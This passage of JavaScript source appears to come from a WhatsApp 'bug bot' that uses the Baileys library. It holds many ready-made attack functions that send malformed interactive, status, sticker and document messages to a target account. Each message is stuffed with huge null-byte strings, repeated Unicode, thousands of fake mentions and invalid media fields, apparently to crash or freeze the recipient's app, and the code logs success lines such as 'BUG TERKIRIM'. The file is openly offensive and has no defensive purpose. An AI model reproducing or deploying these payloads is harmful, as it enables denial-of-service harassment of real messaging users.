          buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":1000000,\"offset\":100},\"reference_id\":\"7eppeli-Yuukey\",\"type\":\"physical-goods\",\"order\":{\"status\":\"canceled\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b\",\"name\":\"D | 7eppeli-Exploration\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":1000}]},\"additional_note\":\"D | 7eppeli-Exploration\",\"native_payment_methods\":[],\"share_payment_status\":true}"
        }
      ],
      messageParamsJson: "{".repeat(1000) + "}".repeat(1000)
    }, 
  }
}, { userJid:target });
  
  await sock.relayMessage(target, msg.message, {
    participant: { jid:target }, 
    messageId: msg.key.id
  }) 
}

async function ForceSix(target) {
  await sock.relayMessage(
    target,
    {
      interactiveMessage: {
        header: {
          title: "~ Gery Tamvw",
          hasMediaAttachment: false
        },
        body: {
          text: ""
        },
        locationMessage: {
          degreesLatitude: 992.999999,
          degreesLongitude: -932.8889989,
          name: "\u900A",
          address: "\u0007".repeat(20000)
        },
        nativeFlowMessage: {
          messageParamsJson: JSON.stringify({
            name: "payment_method"
          }),
          buttonParamsJson: JSON.stringify({
            currency: "XXX",
            payment_configuration: "",
            payment_type: "",
            total_amount: { value: 1000000, offset: 100 },
            reference_id: "4SWMDTS1PY4",
            type: "physical-goods",
            order: {
              status: "payment_requested",
              description: "",
              subtotal: { value: 0, offset: 100 },
              order_type: "PAYMENT_REQUEST",
              items: [
                {
                  retailer_id:
                    "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                  name: "KlearPay",
                  amount: { value: 1000000, offset: 100 },
                  quantity: 1
                }
              ]
            },
            additional_note: "KlearPay",
            native_payment_methods: [],
            share_payment_status: false
          }),
          buttons: [
            {
              name: "single_select",
              buttonParamsJson:
                "Klear Is Here 🪡"
            },
            {
              name: "call_permission_request",
              buttonParamsJson:
                "Klear Is Here 🪡"
            },
            {
              name: "payment_method",
              buttonParamsJson: JSON.stringify({
                currency: "XXX",
                payment_configuration: "",
                payment_type: "",
                total_amount: { value: 1000000, offset: 100 },
                reference_id: "4SWMDTS1PY4",
                type: "physical-goods",
                order: {
                  status: "payment_requested",
                  description: "",
                  subtotal: { value: 0, offset: 100 },
                  order_type: "PAYMENT_REQUEST",
                  items: [
                    {
                      retailer_id:
                        "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                      name: "KlearPay",
                      amount: { value: 1000000, offset: 100 },
                      quantity: 1
                    }
                  ]
                },
                additional_note: "KlearPay",
                native_payment_methods: [],
                share_payment_status: false
              })
            },
            {
              name: "review_order",
              buttonParamsJson: ""
            }
          ]
        }
      }
    },
    { quotedMessage: { jid: target } }
  );
}

async function CInVisible(target, show = true) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " #Rapzhers ",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {}
  )

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  })

  if (show) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "#Crash/u0000",
            },
            content: undefined,
          },
        ],
      }
    )
  }
}

async function DocuMorsh01(target) {
  const msg = {
    stanza: [
      { attrs: { biz_bot: "1" }, tag: "bot" },
      { attrs: {}, tag: "biz" },
    ],
    message: {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "𝐌𝐨𝐬𝐇" + "ꦾ".repeat(4500),
            listType: 2,
            singleSelectReply: { selectedRowId: "🇷🇺" },
            contextInfo: {
              stanzaId: sock.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              quotedMessage: {
                buttonsMessage: {
                  header: {
                    title:
                      "⏤͟͟͞͞𝑰𝒕𝒔𝑴𝒆 𝐾𝑖𝑝𝑜𝑝" +
                      "\u0003".repeat(70000),
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 9007199254740991,
                      mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                      fileName: "⏤͟͟͞͞𝑰𝒕𝒔𝑴𝒆 𝐾𝑖𝑝𝑜𝑝",
                      fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                      directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1723855952",
                      contactVcard: true,
                      thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIAGAARAMBIgACEQEDEQH/xAAnAAEBAAAAAAAAAAAAAAAAAAAABgEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAAvAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf/8QAHRAAAQUBAAMAAAAAAAAAAAAAAgABE2GRETBRYP/aAAgBAQABPwDxRB6fXUQXrqIL11EF66iC9dCLD3nzv//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8Ad//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8Ad//Z",
                    },
                    hasMediaAttachment: true,
                  },
                  contentText: " Hey 👋",
                  footerText: "𝐗 - 𝐌𝐨𝐬𝐞𝐫𝐇",
                  buttons: [
                    {
                      buttonId: "\u0000".repeat(850000),
                      buttonText: {
                        displayText: "⩟⬦𪲁 𝐗 - 𝐌𝐨𝐬𝐞𝐫𝐇 -",
                      },
                      type: 1,
                    },
                  ],
                  headerType: 3,
                },
              },
            },
            description: "INITIATED_BY_USER",
          },
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: {
              text: "\u0003" + "ꦾ".repeat(9999),
              footer: "𝐗 -",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "payment_method",
                  buttonParamsJson: JSON.stringify({
                    currency: "XXX",
                    payment_configuration: "",
                    payment_type: "",
                    total_amount: { value: 1000000, offset: 100 },
                    reference_id: "4SWMDTS1PY4",
                    type: "physical-goods",
                    order: {
                      status: "payment_requested",
                      description: "",
                      subtotal: { value: 0, offset: 100 },
                      order_type: "PAYMENT_REQUEST",
                      items: [
                        {
                          retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                          name: "KlearPay",
                          amount: { value: 1000000, offset: 100 },
                          quantity: 1,
                        },
                      ],
                    },
                    additional_note: "KlearPay",
                    native_payment_methods: [],
                    share_payment_status: false,
                  }),
                },
              ],
              messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
              version: 3,
            },
          },
        },
      },
    },
  };

  await sock.relayMessage(target, msg.message, {
    additionalNodes: msg.stanza,
    participant: { jid: target },
  });
}



async function Delayinvis(target, mention) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "Are You Okey?", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});
  
  await sock.relayMessage(
      "status@broadcast",
      msg.message || msg,
      {
        messageId: msg.key?.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                  },
                ],
              },
            ],
          },
        ],
      }
    );

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg1.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Are you okey?" },
            content: undefined
          }
        ]
      }
    );
  }
}

async function DelayPermanent(target, mention = false) {
   console.log(chalk.red("..........."));
   
   const mentionedJid = [
        "0@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
    ];
    
const msg1 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "ηтє∂ нєℓρ уσυ", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(25000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          }
        }
      }
    }
  }, {});
  
const msg2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "᬴".repeat(9999),
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: [
                            {
                                name: "galaxy_message",
                                paramsJson: "\u0000".repeat(25000),
                                version: 3,
                            },
                            {
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(25000),
                                version: 3,
                            }
                        ],
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
            mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                    `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                )
            ]
        }
    );
    
    const msg3 = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "ηтє∂ нєℓρ уσυ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(25000),
            version: 3
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215)
      .toString(16)
      .padStart(6, "99999999")
  });
  
  const msg4 = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  const msg5 = {
     extendedTextMessage: {
       text: "ꦾ".repeat(25000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

    for (const msg of [msg1, msg2, msg3, msg4, msg5]) {
    await nted.relayMessage(
      "status@broadcast",
      msg.message || msg,
      {
        messageId: msg.key?.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                  },
                ],
              },
            ],
          },
        ],
      }
    );
  }

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg1.key,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "ηтє∂ нєℓρ уσυ" }, // Jangan Diubah
            content: undefined
          }
        ]
      }
    );
  }
}

async function mikirKidz(target) {
  try {
    let message = {
      interactiveMessage: {
        body: { text: "X" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(
                0x2710
              )},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
          ],
          messageParamsJson: "{}",
        },
      },
    };

    for (let iterator = 0; iterator < 1; iterator++) {
      const msg = generateWAMessageFromContent(target, message, {});

      await sock.relayMessage(target, msg.message, {
        additionalNodes: [
          { tag: "biz", attrs: { native_flow_name: "payment_method" } },
        ],
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
      });

      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { native_flow_name: "payment_method" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });

      await new Promise((resolve) => setTimeout(resolve, 500));
    }

    console.log("BUG TERKIRIM");
  } catch (err) {
    console.error(chalk.red.bold(err));
  }
}

async function XStromForce(target) {
  let buttonsFreze = [];

    buttonsFreze.push({
      name: "single_select",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    });
    
    for (let i = 0; i < 2000; i++) {
      buttonsFreze.push({
        name: "call_permission_request",
        buttonParamsJson: JSON.stringify({
          status: true,
        }),
      });
    }
    
    buttonsFreze.push({
      name: "call_permission_request",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    });
    
  
    const biji = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
           body: {
             text: "\u0000" + "ꦾ".repeat(90000),
            },
            footer: {
              text: "\u0000" + "ꦾ".repeat(90000),
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: Array(50).fill("0@s.whatsapp.net"),
              quotedMessage: {
              externalAdReply: {
                title: "ꦾ".repeat(77777),
                body: "\x10".repeat(50000),
                previewType: "PHOTO",
                thumbnail: null,
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://t.me/zyyimupp"
                },
              },
              forwardingScore: 999,
              isForwarded: true
            },
            nativeFlowMessage: {
              buttons: buttonsFreze,
              messageParamJson: JSON.stringify({
                title: "ꦾ".repeat(77777),
                description: "\x10".repeat(25000),
                metadata: {
                junk: "\u0000".repeat(25000)
              }
            })
          }
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(target, proto.Message.fromObject(biji), { userJid: target });
  await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
   console.log(chalk.red(`Succes Sending Bug Force By XStrom-Flower To ${target}`));
}

async function Fongclose(target) {
  const content = {
    extendedTextMessage: {
      text: "\u0000" + "𑇂𑆵𑆴𑆿".repeat(90000),
      matchedText: "https://wa.me/stickerpack/AllTheFeels",
      description: "𑇂𑆵𑆴𑆿".repeat(90000),
      title: "\u0000" + "𑇂𑆵𑆴𑆿".repeat(90000),
      previewType: "NONE",
      jpegThumbnail: null,
    },
  };

  
  const KzxMsg = await generateWAMessageFromContent("status@broadcast", content, {
    ephemeralExpiration: 10,
    timeStamp: Date.now(),
  });

  await sock.relayMessage("status@broadcast", KzxMsg.message, {
    messageId: KzxMsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
              },
            ],
          },
        ],
      },
    ],
  });
}

async function xdelay(target) {
  let zxv = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "what is is your trade?" + "war... \n -Judge Holdem",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
  });
  
  await sock.relayMessage("status@broadcast", zxv.message, {
    messageId: zxv.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined
        }]
      }]
    }]
  });
  console.log(chalk.blue('Send invisible delay')) 
}

async function DelayInvisible(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Company",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function GhostSqL(target) {

  const mentionedList = [
        "696969696969@s.whatsapp.net",
        "phynx@agency.whatsapp.biz",
        ...Array.from({ length: 35000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];
    
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: Math.floor(99.99 * 1073741824).toString(),
                    height: 999,
                    width: 999,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: null,
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493],
                    annotations: [
                        {
                           embeddedContent: {
                             embeddedMusic: {
                               musicContentMediaId: "1",
                                 songId: "peler",
                                 author: ".RaldzzXyz",
                                 title: "PhynxAgency",
                                 artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                 artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                 artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                 artistAttribution: "https://www.instagram.com/_u/raldzzxyz_",
                                 countryBlocklist: true,
                                 isExplicit: true,
                                 artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                               }
                             },
                           embeddedAction: true
                         }
                       ]
                     },
                   hasMediaAttachment: true, 
                 },
                body: { 
                  text: ""
                },
                footer: {
                  text: ""
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(10000)
                }
              }
            ]
          },
          contextInfo: {
            participant: target,
            remoteJid: target,
            stanzaId: sock.generateMessageTag(),
            mentionedJid: mentionedList,
             quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: JSON.stringify({
                        header: "🩸",
                        body: "🩸",
                        flow_action: "navigate",
                        flow_action_payload: { screen: "FORM_SCREEN" },
                        flow_cta: "Grattler",
                        flow_id: "1169834181134583",
                        flow_message_version: "3",
                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                      }),
                      version: 3
                    }
                  }
                }
              }
            },
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function CtaZts(target) {
  const media = await prepareWAMessageMedia(
    { image: { url: "https://l.top4top.io/p_3552yqrjh1.jpg" } },
    { upload: sock.waUploadToServer }
  );

  const Interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot",
              },
            },
          },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  media: media.imageMessage,
                },
                body: {
                  text: " #Hallo Gasy. " + "ꦽ".repeat(100000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: "ꦽ".repeat(2000),
                    },
                  ],
                  messageParamsJson: "{".repeat(10000),
                },
              },
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, Interactive, {
    messageId: null,
    userJid: target,
  });
}

async function forcenew(target) {
  const msg = await generateWaMessageFromcontent(target,  {
    message: {
      interactiveMessage: {
        header: {
          documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
            fileLength: "1402222",
            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
            fileName: "Xzii.js",
            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
            directPath: "//v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
            mediaKeyTimestamp: `1750124469`
          },
          hasMediaAttachment: true
        },
        body: {
          text: "X" + "{".repeat(7000)
        },
        nativeFlowMessage: {
              messageParamsJson: "{".repeat(90000)
        },
        contextInfo: {
          mentionedJid: [target],
          groupMentions: [
            {
              groupJid: target,
              groupSubject: "ALL_CHAT",
              groupMetadata: {
                creationTimestamp: Date.now(),
                ownerJid: "1@s.whatsapp.net",
                adminJids: ["1@s.whatsapp.net", "1@s.whatsapp.net"]
              }
            }
          ],
          externalContextInfo: {
            customTag: "𝐘𝐨𝐮𝐊𝐧𝐨𝐮𝐙......𝟏𝟖𝟎𝟏",
            securityLevel: 0,
            referenceCode: 9741,
            timestamp: 9741,
            messageId: `MSG_${Math.random().toString(36).slice(2)}`,
            userId: "global"
          },
          isForwarded: true,
          quotedMessage: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "1402222",
              pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
              mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
              fileName: "Alway_Modhzy.js",
              fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: 1750124469
            }
          }
        }
      }
    }
  }, {});
      await sock.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
}

async function qNested(target) {
  const media = await prepareWAMessageMedia(
    {
      image: fs.readFileSync('./img.jpg'),
    },
